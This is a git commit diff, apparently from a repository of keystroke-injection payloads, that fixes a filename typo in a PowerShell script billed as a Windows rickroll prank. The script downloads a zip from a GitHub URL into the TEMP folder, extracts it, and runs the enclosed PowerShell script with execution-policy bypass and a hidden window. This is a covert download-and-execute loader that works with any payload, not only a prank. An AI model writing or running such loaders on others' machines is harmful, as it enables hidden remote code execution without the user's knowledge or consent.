f95daecb5eeefb25a257f5502fb867fb9e51355e
Eric <200495807+JestingDart4369@users.noreply.github.com>
2026-06-12 07:45:59 +0000

    Fix typo in Windows Rickroll video player script path

--- WRV-run.ps1
+++ WRV-run.ps1
@@ -2,4 +2,4 @@ $U='https://github.com/JestingDart4369/Ducky-script-public/blob/main/Windows-ric
 $Z="$env:TMP"+'\Windows-rickroll-vido.zip'
 $D="$env:TMP"+'\Windows-rickroll-vido'
 iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force
-powershell $D\Windows-rickroll-vido-player.ps1 -exec Bypass -w h -NoP -NonI
+powershell $D\Windows-rickroll-video-player.ps1 -exec Bypass -w h -NoP -NonI
